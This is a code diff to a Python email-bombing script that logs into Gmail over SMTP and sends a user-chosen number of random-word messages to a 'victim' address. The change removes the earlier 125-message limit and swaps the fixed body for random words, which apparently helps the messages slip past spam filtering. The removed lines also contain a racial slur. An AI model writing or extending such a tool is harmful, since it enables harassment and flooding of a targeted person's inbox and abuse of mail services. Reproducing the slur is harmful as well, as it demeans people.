@@ -1,17 +1,26 @@
 import smtplib
 import time
 import random
+import os
+import colorama
+from colorama import Fore, Back, Style
 from random_word import RandomWords
 
-user = "EMAIL"
-passwd = "PASSWORD"
+colorama.init()
+print(Fore.LIGHTCYAN_EX + "")
+
+user = "EMAIL HERE"
+passwd = "PASSWORD HERE"
 victim = input("please input victim email here\n")
 
 def mail_sender():
     r = RandomWords()
+    w = r.get_random_word()
     x = r.get_random_word()
-    subject = x
-    msg = "Totally not spam or anything"
+    y = r.get_random_word()
+    z = r.get_random_word()
+    subject = w
+    msg = x + " " + y + " " + z
     message = "Subject:" + subject + "\n" + msg
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.login(user , passwd)
@@ -22,17 +31,11 @@ def mail_sender():
     server.quit()
 
 def spam():
-    spam_count = int(input("how many emails to send? MUST BE UNDER 125\n"))
-    if spam_count <= 125:
-        print("we good. spamming now")
-        for i in range(spam_count):
+    spam_count = int(input("how many emails to send?"))
+    for i in range(spam_count):
             mail_sender()
             print("message sent!")
             zzz = random.randint(1,9)
             time.sleep(zzz)
 
-    else:
-        print("the fuck wrong with u nigga\nthink about the shit u just did")
-        time.sleep(2)
-        exit()
 spam()
